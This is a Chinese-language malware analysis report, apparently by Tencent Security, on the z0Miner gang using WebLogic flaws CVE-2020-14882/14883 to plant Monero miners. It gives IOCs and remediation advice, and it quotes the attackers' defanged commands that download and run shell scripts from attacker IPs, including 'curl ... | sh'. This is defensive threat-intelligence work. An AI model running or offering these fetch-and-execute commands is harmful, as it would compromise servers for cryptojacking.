## 一、背景

腾讯主机安全（云镜）于2020.11.02日捕获到挖矿木马团伙z0Miner利用Weblogic未授权命令执行漏洞（CVE-2020-14882/14883）的攻击行动。该团伙通过批量扫描云服务器发现具有Weblogic漏洞的机器，发送精心构造的数据包进行攻击。之后执行远程命令下载shell脚本z0.txt运行，再利用该shell脚本植入门罗币挖矿木马、挖矿任务本地持久化，以及通过爆破SSH横向移动。根据该团伙控制的算力推算，已有大约5000台服务器受害。

由于Weblogic未授权命令执行漏洞（CVE-2020-14882/14883）10月21日才被官方公布，有许多企业未来得及修复，同时该漏洞的补丁存在被绕过的风险。因此该挖矿木马可能对云主机造成较大威胁。

腾讯安全建议企业检查服务器上是否存在文件/tmp/javax/ssd2，检查crontab定时任务中是否存在可疑下载命令，删除挖矿木马文件和相关任务，检查Weblogic是否属于受影响版本并及时采取修复措施。

腾讯安全主机安全（云镜）、云防火墙、漏洞扫描系统、腾讯高级威胁检测系统（御界）均于10月28日升级，支持对该漏洞以及随后的补丁绕过风险进行检测和拦截。Oracle也于11月2日发布新更新，以解决CVE-2020-14882补丁被绕过的风险。腾讯安全专家建议用户尽快将Weblogic组件升级到最新版本。

## 二、详细分析

10月21日，Oracle官方发布数百个组件的高危漏洞公告。其中多个Weblogic组件相关高危漏洞引起业界高度关注。未经授权的攻击者可以绕过WebLogic后台登录等限制，直接远程利用反序列化漏洞，从而接管WebLogic服务器，风险极大。

10月28日，腾讯安全团队关注到互联网上已出现CVE-2020-14882和CVE-2020-14883两个高危漏洞POC（验证代码），未经身份验证的远程攻击者可能通过构造特殊的HTTP
GET请求，利用该漏洞在受到攻击的WebLogic Server上执行任意代码。漏洞影响Oracle WebLogic Server的多个版本：

10.3.6.0.0

12.1.3.0.0

12.2.1.3.0

12.2.1.4.0

14.1.1.0.0

11月02日腾讯云捕获到挖矿木马z0Miner利用CVE-2020-14882的攻击行为。攻击者精心构造具有CVE-2020-14882漏洞利用代码的数据包后，通过210.108.70.119向目标服务器发送请求。

![](https://image.3001.net/images/20201104/1604458251_5fa2170b35d200f50c50b.png!small)

漏洞攻击成功后在Payload中执行远程代码：

1.curl -fsSL http[:]//218.61.5.109/errors/z0.txt -o /tmp/solr

2.bash /tmp/solr

该代码下载shell脚本z0.txt保存为/tmp/solr并通过bash命令执行。z0.txt首先通过匹配进程和文件名清除竞品挖矿木马。

![](https://image.3001.net/images/20201104/1604458267_5fa2171b1fe8828a7f23c.png!small)

![](https://image.3001.net/images/20201104/1604458276_5fa21724f3b2d5dab0963.png!small)

然后安装crontab定时任务进行持久化，定期下载木马https[:]//pastebin.com/raw/kkMGTEB4以及shell脚本https[:]//pastebin.com/raw/kkMGTEB4到失陷主机上运行，目前该URL返回数据为“exit”，可能在后续攻击中添加恶意代码。

![](https://image.3001.net/images/20201104/1604458286_5fa2172ee8308e3c62241.png!small)

![](https://image.3001.net/images/20201104/1604458298_5fa2173a2b0a17f82e171.png!small)

通过SSH远程登陆已经认证过的机器进行横向移动，并在感染后执行远程命令：

curl -fsSL http[:]//189.7.105.47:8181/examples/jsp/z0.txt | sh

![](https://image.3001.net/images/20201104/1604458308_5fa2174456c1e85c3d192.png!small)

最后下载门罗币挖矿木马javae.exe保存至/tmp/javax/ssd2，通过脚本config.sh启动挖矿。

![](https://image.3001.net/images/20201104/1604458317_5fa2174de84ffb9306ae3.png!small)

挖矿木马采用开源挖矿程序XMRig编译，挖矿使用钱包

43vpvnvubbGUMuGffKAbwfeDYHRiDtBKWKUcncVttFMYHJyPV6DbHG7b3oSXSK52Fe3VF27zi9ai2CqCRcUvMmDbNMGWpuY。

![](https://image.3001.net/images/20201104/1604458328_5fa21758e5eebfd3daa9c.png!small)![](https://image.3001.net/images/20201104/1604458339_5fa21763cb31576ff4050.png!small)

由于该木马刚刚上线，目前挖矿获得收益只有0.1个XMR，但根据其算力133 KH/s推算其已控制约5000台服务器进行挖矿。

![](https://image.3001.net/images/20201104/1604458352_5fa217707d8c67d182102.png!small)

## IOCs

**IP**

222.108.2.20

218.61.5.109

189.7.105.47

210.108.70.119

 **Md5**

javae.exe 373b018bef17e04d8ff29472390403f9

z0.txt 48072a4ad46bf20ddd6fdc6a19155c78

z0.txt 067a531e8580fe318ebff0b4038fbe6b

config.sh 5020b71e9cd1144c57f39c9d4072201b

 **URL**

http[:]//222.108.2.20/about/javae.exe

http[:]//218.61.5.109/errors/z0.txt

http[:]//218.61.5.109/errors/config.sh

http[:]//189.7.105.47:8181/examples/jsp/config.json

http[:]//189.7.105.47:8181/examples/jsp/config.sh

http[:]//189.7.105.47:8181/examples/jsp/z0.txt

https[:]//pastebin.com/raw/qKcPmSNp

https[:]//pastebin.com/raw/kkMGTEB4

 **钱包：**

43vpvnvubbGUMuGffKAbwfeDYHRiDtBKWKUcncVttFMYHJyPV6DbHG7b3oSXSK52Fe3VF27zi9ai2CqCRcUvMmDbNMGWpuY

## Weblogic 漏洞事件时间线

10月21日，Oracle官方发布数百个组件的高危漏洞公告，其中包括CVE-2020-14882和CVE-2020-14883两个weblogic的高危漏洞公告；

10月28日，互联网上出现CVE-2020-14882和CVE-2020-14883两个高危漏洞POC（验证代码），同日，腾讯安全旗下的全系列安全产品支持该漏洞的检测和防御；

10月30日，安全研究人员注意到CVE-2020-14882漏洞补丁存在被绕过的风险：在Weblogic完成补丁更新的情况下，未经授权的攻击者仍可绕过WebLogic后台登录等限制，并控制服务器。腾讯安全实测验证，28日的检测拦截方案依然有效；

10月30日，腾讯云防火墙捕获大量利用WebLogic console 远程代码执行漏洞（CVE-2020-14882/14883）的在野攻击；

11月2日，Oracle官方更新安全公告，Oracle WebLogic Server远程代码执行漏洞（CVE-2020-14882）的绕过已被修复；

11月2日，腾讯安全捕获挖矿木马团伙z0Miner利用Weblogic未授权命令执行漏洞（CVE-2020-14882/14883）的攻击行动。该团伙通过批量扫描云服务器发现具有Weblogic漏洞的机器，发送精心构造的数据包进行攻击。

## 参考链接：

<https://mp.weixin.qq.com/s/LIjO2St8PdvXm3lS5wsJPQ>

<https://mp.weixin.qq.com/s/6qsjUMJaUpUQHZYdsB3Ntw>

<https://blog.rapid7.com/2020/10/29/oracle-weblogic-unauthenticated-complete-takeover-cve-2020-14882-what-you-need-to-know/>

